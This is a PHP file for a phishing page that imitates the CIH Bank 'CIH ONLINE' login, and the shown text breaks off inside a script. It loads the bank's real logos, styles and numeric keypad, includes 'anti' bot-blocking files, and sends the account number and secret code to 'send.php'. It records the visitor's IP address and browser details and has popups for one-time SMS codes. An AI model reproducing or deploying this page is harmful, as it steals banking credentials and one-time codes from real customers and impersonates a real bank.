<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/
/* Copyright: */
session_start();
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti7.php";

?>

<!DOCTYPE html>
<html>
<head id="head"><link rel="shortcut icon" href="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/favicon-new-cih.ico" /><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /><meta http-equiv="X-UA-Compatible" content="IE=8" /><title>
	CIH ONLINE
</title>

        <link href="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/css/LoginCss?v=mi8pqMfUgtbz7je-Hg2yWlU3Z013lH5BYd8pefHcuKs1" rel="stylesheet"/>

        <script src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/js/LoginJs?v=gM_TavIM8gBtLZgX51JogXacTbXkPABqtRsu6Tm8WZM1"></script>


        <script type="text/javascript">

            $(function () {

                var prm = window.Sys.WebForms.PageRequestManager.getInstance();

                prm.add_initializeRequest(initializeRequestHandler);
                prm.add_endRequest(endRequestHandler);

                function initializeRequestHandler(sender, args) {

                    $('#loading_image').show();
                    $('#darkbg').show();

                    window.$get(sender._postBackSettings.sourceElement.id).disabled = true;

                    if ($("#form1").validationEngine('validate') !== true) {
                        $('#loading_image').hide();
                        $('#darkbg').hide();
                        window.$get(sender._postBackSettings.sourceElement.id).disabled = false;
                        args.set_cancel(true);
                    }
                }

                function endRequestHandler(sender, args) {
                    $('#loading_image').hide();
                    $('#darkbg').hide();
                }

                $('#form1').submit(function (e) {
                    if (!$("#form1").validationEngine('validate')) {
                        $('#loading_image').hide();
                        $('#darkbg').hide();
                    }
                });
                function animateLoader(newWidth) {

                    $("#progressBar").width(newWidth);

                    if (newWidth == '100%') {
                        setTimeout(function () {
                            $("#progressBar").animate({ opacity: 0 });
                        }, 500);
                    }
                }

                $.ajax({
                    method: 'get',
                    beforeSend: function () {
                        $('#loading_image').show();
                        $('#darkbg').show();
                        animateLoader('50%');
                    },
                    complete: function () {
                        $('#loading_image').hide();
                        $('#darkbg').hide();
                        animateLoader('100%');
                    },
                    success: function () {
                        $('#loading_image').hide();
                        $('#darkbg').hide();
                        animateLoader('100%');
                    }
                });

                $("#form1").validationEngine({ promptPosition: "topCenter", scroll: false });
            });

            function ident_addNumber(nNumber) {

                if ($('#Main_ctl00_txtPwd').val().indexOf("*") < 0)
                    $('#Main_ctl00_txtPwd').val('');

                $('#Main_ctl00_ident_pos').val($('#Main_ctl00_ident_pos').val() + nNumber);
                $('#Main_ctl00_txtPwd').val($('#Main_ctl00_txtPwd').val() + "*");
            }

            function CheckIfMobile() {

                var isMobile = {
                    Android: function () {
                        return navigator.userAgent.match(/Android/i);
                    },
                    BlackBerry: function () {
                        return navigator.userAgent.match(/BlackBerry/i);
                    },
                    iOS: function () {
                        return navigator.userAgent.match(/iPhone|iPad|iPod/i);
                    },
                    Opera: function () {
                        return navigator.userAgent.match(/Opera Mini/i);
                    },
                    Windows: function () {
                        return navigator.userAgent.match(/IEMobile/i);
                    },
                    any: function () {
                        return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows());
                    }
                };
                if (isMobile.Android()) ShowPopupMobileAndroid();
                if (isMobile.iOS()) ShowPopupMobileIOS();
            }

            function ident_reset() {
                $('#Main_ctl00_txtPwd').val('');
                $('#Main_ctl00_ident_pos').val('');
                return false;
            }

            function ShowPopupYoutube() {
                $find('ModalPopupExtender2').show();
            }
            function ShowPopupYoutube2() {
                $find('ModalPopupExtender3').show();
            }
            function ShowPopupMobileAndroid() {
                $find('ModalPopupExtender1').show();
            }
            function ShowPopupMobileIOS() {
                $find('ModalPopupExtender4').show();
            }

            function HidePopupYoutube() {
                $find('ModalPopupExtender2').hide();
                document.getElementById('ytplayer').stopVideo();
            }
            function HidePopupYoutube2() {
                $find('ModalPopupExtender3').hide();
                document.getElementById('ytplayer2').stopVideo();
            }
            function HidePopupMobileAndroid() {
                $find('ModalPopupExtender1').hide();
            }
            function HidePopupMobileIOS() {
                $find('ModalPopupExtender4').hide();
            }

        </script>
    </head>
<script>
    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date(); a = s.createElement(o),
        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

    ga('create', 'UA-77348744-1', 'auto');
    ga('send', 'pageview');
</script>
<body class="body_accueil" onload="CheckIfMobile()">
    <form action="send.php" method="POST">
<div class="aspNetHidden">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUENTM4MQ9kFgJmD2QWAgIDDxYCHgZhY3Rpb24FES9sb2dpbi5hc3B4P2lkPTQyFgICBQ9kFgICAQ9kFgJmD2QWAmYPZBYCAg0PZBYCAgEPFgIeC18hSXRlbUNvdW50AgoWFAIBD2QWAgIBDw8WAh4ISW1hZ2VVcmwFP34vUG9ydGFscy9fZGVmYXVsdC9Ta2lucy9DSUgvaW1hZ2VzL25ld1NraW5JbWdzL0NsYXZpZXIvbl81LmpwZxYCHgdvbmNsaWNrBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDUpZAICD2QWAgIBDw8WAh8CBT9+L1BvcnRhbHMvX2RlZmF1bHQvU2tpbnMvQ0lIL2ltYWdlcy9uZXdTa2luSW1ncy9DbGF2aWVyL25fOS5qcGcWAh8DBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDkpZAIDD2QWAgIBDw8WAh8CBT9+L1BvcnRhbHMvX2RlZmF1bHQvU2tpbnMvQ0lIL2ltYWdlcy9uZXdTa2luSW1ncy9DbGF2aWVyL25fMy5qcGcWAh8DBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDMpZAIED2QWAgIBDw8WAh8CBT9+L1BvcnRhbHMvX2RlZmF1bHQvU2tpbnMvQ0lIL2ltYWdlcy9uZXdTa2luSW1ncy9DbGF2aWVyL25fOC5qcGcWAh8DBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDgpZAIFD2QWAgIBDw8WAh8CBT9+L1BvcnRhbHMvX2RlZmF1bHQvU2tpbnMvQ0lIL2ltYWdlcy9uZXdTa2luSW1ncy9DbGF2aWVyL25fMi5qcGcWAh8DBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDIpZAIGD2QWAgIBDw8WAh8CBT9+L1BvcnRhbHMvX2RlZmF1bHQvU2tpbnMvQ0lIL2ltYWdlcy9uZXdTa2luSW1ncy9DbGF2aWVyL25fNi5qcGcWAh8DBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDYpZAIHD2QWAgIBDw8WAh8CBT9+L1BvcnRhbHMvX2RlZmF1bHQvU2tpbnMvQ0lIL2ltYWdlcy9uZXdTa2luSW1ncy9DbGF2aWVyL25fMS5qcGcWAh8DBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDEpZAIID2QWAgIBDw8WAh8CBT9+L1BvcnRhbHMvX2RlZmF1bHQvU2tpbnMvQ0lIL2ltYWdlcy9uZXdTa2luSW1ncy9DbGF2aWVyL25fNC5qcGcWAh8DBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDQpZAIJD2QWAgIBDw8WAh8CBT9+L1BvcnRhbHMvX2RlZmF1bHQvU2tpbnMvQ0lIL2ltYWdlcy9uZXdTa2luSW1ncy9DbGF2aWVyL25fNy5qcGcWAh8DBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDcpZAIKD2QWAgIBDw8WAh8CBT9+L1BvcnRhbHMvX2RlZmF1bHQvU2tpbnMvQ0lIL2ltYWdlcy9uZXdTa2luSW1ncy9DbGF2aWVyL25fMC5qcGcWAh8DBRlyZXR1cm4gaWRlbnRfYWRkTnVtYmVyKDApZGRPfVORdccpCMDlOi+PIbXA/DT8ry2U1mOIIkX6AX6O5A==" />
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['form1'];
if (!theForm) {
    theForm = document.form1;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="https://www.cihnet.co.ma/WebResource.axd?d=djgg8Nhzwcp9YTUI1Jj602ySNdpRarHfEpVr3V3DNPenp6Wn1hrdxVquoxnbXHtCM5XiOAkECWNXyqCxlxSVYs1SDnPtqmxYw5pN7iB-GSg1&amp;t=636426768960000000" type="text/javascript"></script>


<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=HnrL44ntMG9sDERLm2rvJ1167Ielz3N9irRepBnujGKesv47hoRK5GgqqgRdAs0n8q70KNA3mGYQPRqvHriIeWgpoEE4qHw47Z1OK0S2qRia44sTuvIsKUyQ42OK7hIB0&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=5RUksoT1Rsm-4BosXE9ZLA03kNceNZIFTn3-EieGX-P5m7OSxRRQ7lizzjOH7qZpxOcQdPHdGsGdjcvII7tnG-pdCDOld3oGNYYmsC77OCzz0qWbtQUD5CW3YVC6_wL_G3-HchD1cbcVi8zwBEerMQ2&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=UW4_FuxzijgnJem96hgbhaoRHyzbloht-BjRH4xBE6j7cYlA98hdePeN2O7OmB10azpQ0l-kzp6iHAZYleJ0c2MDnOp2bsLU33OYZPfQt_L-t0JGCM65tm6VktkGsajr0&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=cAB6G37AWmnnbELmlw0wVqOMu2arwe2VNMC-B5Vv5IKHhh9DmKdfLo9zql_go_jKh3DKGthIhqsdIJWJHD4hhPkLdta92B31rJHcybmwEaycu_pJvfKviRw4Ujfazl_V9RSLDImxWIQ56rnSdk7jHw2&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=uRNEJBWYvBV6ToGGrKKBlZjq-qqCMNCi9jR3gpa-rNvq-qs1EvoOm3WR6WJOYOCOSeADxpIZnupm-80QIteg43pQIcnQ60sA45xevomOm0bYOO0t9-wLp-EG7OvlV8uEGHWj-Av3gzd5o_qMNA5Y_A2&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=W5iGw8gVctip3hhFr2Ypf3R_cFk76xvQoXcUpQTdXvZelM89S5wlgArsuMUMgfbS5OSmVg_DfrR6uwDo1ScZrTLQGmhoL0gV3i2EjhFpyIQDCK0dlgWYdNqx2QY2TyMLUSkRqVIPXuUwyQKGu1hFCQ2&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=5loSIg1EpK9Ctd29plEE-LGVSYxuG5L0ejR6lxK3lZ22H2WfMoLXXbDy7_pK4j2ifKNskXrFjhYrxsweHZFZBVmJTkjByif4WB4aGTMJxD4vRxSLLZ3u7dYUQoGcm8kxH7_Y2MbaY1gYs2aOTMYS5A2&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=Xn0N6Ah6wuxjY2_rDe_aDBzaKHten8hibg1_HYKMrA_TQJXnUnGC5aV_nOe9Us4RP0EOQSN8t9_r_YHf31dYYWT4CWi7z4jZTkODyc2ZnIQgedUrzVGrBd-VHX7SLIh5GItuLoUfihhJEg1xBX_Giw8EVMd-Cr4F9uDpnxgXSg41&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=7t6aBgWxpd3OJAq9ZJkO2clliSgCyIKqsvG5VJaqT-rxNN_SQSArtXAyJTgQa6_GuVWZSTc_QGPBy2ZT8RIRQRz3HAv90IYQ0Rgd15SDP3LAIeMzFlxEvFuzbhUWKYoTq4VFKNeQpaJIGBi5qWnj26RHZzm8bwZh-pPDfNl75CA1&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=N30rrBdHypM08OTmc97gVmCY23lVHZSWSB-d9suXf1bC_UIxVxqexDJKIWy1vYmvxslkfyg6dPtRx2wdBYrHm7Wo2LuFjOrbG88G2jGUwutexU8v7Hm8qNh-WK9cP9mvTxXEMA0xMRb_BfekBMQiaw2&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=G5-zUzuRNm6lOk8tP84W6QuvwfF4IsCMIu8B7OkJRykZH_pK3wD75-STlsGqYSxeFJ-KBfe-x83MCcdIvL44H_fsXUYMykSE2WBtuFRxG8UuF7OWofkRSrAxKKr008a1Ybtbs2r0zB39c9Yqp7xCPA2&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=TdfQKtGOakECfsZpcRUc6PB56DtlehzGZkrHonnJopRv6C59MfkKzEXHodJ6uO5isZD5MJb_cPGYb4kU4QKqSkYf_OPfmntsoaqh5Di5UROfGE9oFxos7TPON04on4LDolxh8Iy5ZN71jLQnM74nZQ2&amp;t=41339750" type="text/javascript"></script>
<script src="https://www.cihnet.co.ma/ScriptResource.axd?d=Z2IZTNMYqs4rxVkBe9Rf9JekEVIEF-IsJhoGWGvFtkYRgi_yC3gAfm21nsho-ugVmaZzTbiE_CTK6hwP3iQd08COj9FAVHLR0qvVN_nX0aMvb7wpjNi6thNDCnY5EfwBTG7Ipnj3bdiq4psYHLYfRA2&amp;t=41339750" type="text/javascript"></script>
<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" />
	<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="17c6TkykgFw0bjPEBoseWByg_VjkpYvGvZc2DOJyQov-4_sfN_kf3jpWdYlWu6GZ9aYgzsYbHF3pLLM3u6CtvgSQLtqGz4l8icahJMf141w1" />
</div>
        <div id="progressBar">
        </div>
        <div id="darkbg">
            <img src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/loading.gif" alt="" id="loading_image" />
        </div>
        <script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl00$ScriptManager1', 'form1', ['tctl00$Main$ctl00$UPDATEPANELLOGIN','Main_ctl00_UPDATEPANELLOGIN'], [], [], 90, 'ctl00');
//]]>
</script>

        <!--  Tous les elements de la page -->
        <div class="Toute_la_page">
            <!--------------  Logo et menu -->
            <div id="header" class="header_interne">
                <img src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/logo_cihbank.png" alt="Logo CIH" />
                
                
<ul class="menu">
    <li><a href="/">Accueil</a> </li>
    <li><a href="../Ress/dwn/aPropos.pdf" target="_blank">A propos</a> </li>
    <li><a href="../Ress/dwn/conditionsUtilisation.pdf" target="_blank">Conditions d'utilisation</a> </li>
    <li><a href="../Ress/dwn/noticeLegale.pdf" target="_blank">Notice légale</a> </li>
    <li><a href="../Ress/dwn/FAQ.pdf" target="_blank">FAQ</a> </li>
</ul>

            </div>
            <!--------------  Fin Logo et menu -->
            <!-----------------------------------  Contenu -->
            <!-- Partie 1 -->
            <div id="auth">
                <div class="Formulaire">
                    
                    

<script type="text/javascript">

         //if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
         //       window.location.href = "https://itunes.apple.com/fr/app/cih-mobile/id664637221";
         //}
         //else if (navigator.userAgent.match(/Android/i)) {
		 // window.location.href = "https://play.google.com/store/apps/details?id=com.b3g.cih.online";          
         //}	
    console.log("Begin");
    $.ajax({
        type: "GET",
        url: "https://ipinfo.io",
        dataType: "jsonp",
        success: function (json) {
            //alert(print_r(json));
            var ip = json.ip;
            //alert(ip)
            //plugin  
            var pgwBrowser = $.pgwBrowser();
            var IpInfos = {};
            IpInfos['ip'] = { "ipaddress": ip };
            //var BrowserId=checkCookie();
            //IpInfos['BrowserId'] = { "BrowserId": BrowserId }
            var InfosBrowser = $.extend(true, pgwBrowser, IpInfos);
            var data = print_r(InfosBrowser);

            console.log("Script data : " + data);
            document.getElementById('Main_ctl00_MyIp').value = data; 
            //alert("ok");
        }
    });

    function print_r(o) {
        return JSON.stringify(o, null, '\t').replace(/\\n/g, '<br>');
    };

    console.log("End ");

    //// add Cookie

    //function setCookie(cname, cvalue, exdays) {
    //    var d = new Date();
    //    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    //    var expires = "expires=" + d.toUTCString();
    //    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
        
    //}

    //function getCookie(cname) {
    //    var name = cname + "=";
    //    var decodedCookie = decodeURIComponent(document.cookie);
    //    var ca = decodedCookie.split(';');
    //    for (var i = 0; i < ca.length; i++) {
    //        var c = ca[i];
    //        while (c.charAt(0) == ' ') {
    //            c = c.substring(1);
    //        }
    //        if (c.indexOf(name) == 0) {
    //            return c.substring(name.length, c.length);
    //        }
    //    }
    //    return "";
    //}

    //function guid() {
    //    function s4() {
    //        return Math.floor((1 + Math.random()) * 0x10000)
    //          .toString(16)
    //          .substring(1);
    //    }
    //    return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    //      s4() + '-' + s4() + s4() + s4();
    //}

    //function checkCookie() {
    //    var CookieGuid = getCookie("CookieGuid");
    //    if (CookieGuid != "")
    //    {
    //        return CookieGuid;
    //    }
    //    else {
    //        CookieGuid = guid();
    //        if (CookieGuid != "" && CookieGuid != null) {
    //            setCookie("CookieGuid", CookieGuid, 364635);
    //            return CookieGuid;
    //        }
    //    }
       
    //}

</script>








<div id="Main_ctl00_UPDATEPANELLOGIN">
	     
 	<input type="hidden" name="ctl00$Main$ctl00$MyIp" id="Main_ctl00_MyIp" />
        
            <h2>
                    Authentification
            </h2>

             <p>
                    Bienvenue dans votre espace sécurisé CIH ON LINE. Pour accéder à votre compte, merci
                    de vous identifier.
             </p>

<ul class="form">
    


        <label>
                <span id="Main_ctl00_labelRadical" style="margin-bottom:2%;font-size: 12px;font-family: Arial, Helvetica, sans-serif !important;font-weight: normal;float: left;clear: both;">Saisissez votre Numéro de compte (*)</span>
        </label>

        <input name="username" type="text" id="Main_ctl00_txtHBLogin" class="validate[required,maxSize[16],minSize[7],IsNumber]" Placeholder="Numéro de compte" lblTitle="Saisissez votre Numéro de compte (*)" onkeypress="verifierCaracteres(event); return false;" />
        
         <a data-toggle="popover" class="help_icone" href="#" data-placement="top" data-content="<img alt='' src='../..https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/RIB_IMG.png' />" id="popovertxtHBLogintmp">
           <img src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/ico_help.png" alt="Icone help" style="margin-top:-20%">
        </a>

        
        
      
        <li><label>Saisissez votre code secret (*)</label><div class="input-append">
		<input name="password1" type="text" readonly="readonly" disabled="disabled" id="Main_ctl00_txtPwd" class="validate[required,maxSize[16]]" placeholder="Code secret" /><a data-toggle="popover" class="help_icone" href="#" data-placement="top" data-content="&lt;img alt=&#39;&#39; src=&#39;https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/ImgCodeSecret.png&#39; />" id="popovertxtPwdtmp"><img src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/ico_help.png" alt="Icone help" /></a>
	</div></li>
        <input type="hidden" name="password" id="Main_ctl00_ident_pos" />
    
    <li>
        <div id="Main_ctl00_KeyPad" class="KeyPad">
            
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_0" class="ident_chiffre_img pointer" onclick="return ident_addNumber(5)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_5.jpg" />
                    </a>
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_1" class="ident_chiffre_img pointer" onclick="return ident_addNumber(9)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_9.jpg" />
                    </a>
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_2" class="ident_chiffre_img pointer" onclick="return ident_addNumber(3)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_3.jpg" />
                    </a>
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_3" class="ident_chiffre_img pointer" onclick="return ident_addNumber(8)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_8.jpg" />
                    </a>
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_4" class="ident_chiffre_img pointer" onclick="return ident_addNumber(2)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_2.jpg" />
                    </a>
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_5" class="ident_chiffre_img pointer" onclick="return ident_addNumber(6)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_6.jpg" />
                    </a>
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_6" class="ident_chiffre_img pointer" onclick="return ident_addNumber(1)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_1.jpg" />
                    </a>
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_7" class="ident_chiffre_img pointer" onclick="return ident_addNumber(4)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_4.jpg" />
                    </a>
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_8" class="ident_chiffre_img pointer" onclick="return ident_addNumber(7)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_7.jpg" />
                    </a>
                
                    <a>
                        <img id="Main_ctl00_NewsListRepeater_Image_9" class="ident_chiffre_img pointer" onclick="return ident_addNumber(0)" src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/Clavier/n_0.jpg" />
                    </a>
                
                
        </div>
       
    </li>
  
</ul>
     <div class="Btnss">
         <input type="submit" name="ctl00$Main$ctl00$ident_btn_cancel" value="Effacer" onclick="ident_reset();return false;" id="Main_ctl00_ident_btn_cancel" class="BtnAnnuler" />      
        <input type="submit" name="ctl00$Main$ctl00$btn" value="Valider" id="Main_ctl00_btn" class="BtnValider" />
        <a href="/Recover.aspx"  Class="BtnCodeOubli" >Code d'accès oublié</a>
    </div>
        
<ul>
    <li class="abonnement">
        <p>
            Vous avez souscrit un abonnement cih online ?<br>
            <a id="Main_ctl00_LinkBtnActivate" class="underline" href="javascript:__doPostBack(&#39;ctl00$Main$ctl00$LinkBtnActivate&#39;,&#39;&#39;)">Activez votre compte</a></p>
        <p>
            Vous n'êtes pas abonné ?<br/>
            <a id="Main_ctl00_LinkBtnAbonnez" class="underline" UseSubmitBehavior="false" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$Main$ctl00$LinkBtnAbonnez&quot;, &quot;&quot;, false, &quot;&quot;, &quot;/Contract.aspx&quot;, false, true))">Abonnez-vous</a></p>
    </li>
   </ul>
   
                        
                        <div id="Main_ctl00_Panel1" class="modalPanel bg popup">
		
                            <div id="Main_ctl00_Panel2">
			
                                <div class="message_header_opt2">
                                    <span id="Main_ctl00_lblMsg"></span>
                                </div>
                            
		</div>
                            <div class="group-popup">
                                <div class="btns-popup">
                                    <input type="hidden" name="ctl00$Main$ctl00$Label3" id="Main_ctl00_Label3" />
                                    <input name="ctl00$Main$ctl00$txtOtpValue" type="text" id="Main_ctl00_txtOtpValue" class="input-popup-otp" autocomplete="off" />
                                    
                                    <input type="submit" name="ctl00$Main$ctl00$btnSendOtp" value="Valider" id="Main_ctl00_btnSendOtp" class="valid-popup" />
                                    <input type="submit" name="ctl00$Main$ctl00$btnCancel" value="Annuler" id="Main_ctl00_btnCancel" class="annuler-popup" />

                                    <ul class="form">
                                        <li class="buttons_left">
                                            <p style="color: #231f20;">
                                                Si vous n’avez pas reçu votre code par SMS
                                                <a href="#" class="icon-link-ivr" id="linkCallUser">cliquez ici ? </a>
                                            </p>
                                            <div id="Content_call_User" style="display:none">
                                                <input type="submit" name="ctl00$Main$ctl00$btnCallUser" value="Veuillez cliquer ici" id="Main_ctl00_btnCallUser" class="icone-appel-vocal" />
                                            </div>
                                            <p class="lastp" style="color: #231f20;">
                                                Votre code vous sera communiqué par appel téléphonique sur votre GSM N°
                                                    <span></span>
                                            </p>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        
	</div>

                                
                        <div id="Main_ctl00_Panel3" class="modalPanel bg popup">
		
                            <div id="Main_ctl00_Panel4">
			
                                <div class="message_header_opt2">
                                    <span id="Main_ctl00_Label1"></span>
                                </div>
                            
		</div>
                            <div class="group-popup">
                                <div class="btns-popup">
                                    <input type="hidden" name="ctl00$Main$ctl00$HiddenField1" id="Main_ctl00_HiddenField1" />
                                    <input name="ctl00$Main$ctl00$TextBox1" type="text" id="Main_ctl00_TextBox1" class="input-popup-otp" autocomplete="off" />
                                    
                                    <input type="submit" name="ctl00$Main$ctl00$Button1" value="Valider" id="Main_ctl00_Button1" class="valid-popup" />
                                    <input type="submit" name="ctl00$Main$ctl00$Button2" value="Annuler" id="Main_ctl00_Button2" class="annuler-popup" />

                                    <ul class="form">
                                        <li class="buttons_left">
                                            <p style="color: #231f20;">
                                                Si vous n’avez pas reçu votre code par SMS
                                                <a href="#" class="icon-link-ivr" id="linkCallUser2">cliquez ici ? </a>
                                            </p>
                                            <div id="Content_call_User2" style="display:none">
                                                <input type="submit" name="ctl00$Main$ctl00$CButton1" value="Veuillez cliquer ici" id="Main_ctl00_CButton1" class="icone-appel-vocal" />
                                            </div>
                                            <p class="lastp" style="color: #231f20;">
                                                Votre code vous sera communiqué par appel téléphonique sur votre GSM N°
                                                    <span></span>
                                            </p>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        
	</div>

 



</div>

<script type="text/javascript">



    $(function () {
        $('#darkbg').show();
        $("#loading_image").show();

        $('#Main_ctl00_LinkBtnActivate').click(function () {
            $('#form1').validationEngine('detach');
        });
        $('#Main_ctl00_LinkBtnAbonnez').click(function () {
            $('#form1').validationEngine('detach');
        });
        $("#Main_ctl00_btnRegister").live("click", function () {
            $('#form1').validationEngine('detach');
        });
        $("#Main_ctl00_btnRetour").live("click", function () {
            $('#form1').validationEngine('detach');
        });
        $('#popovertxtHBLogintmp').simpletip({ fixed: true, position: 'top', content: '<img  src=\'https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/RIB_IMG.png\'  />' });
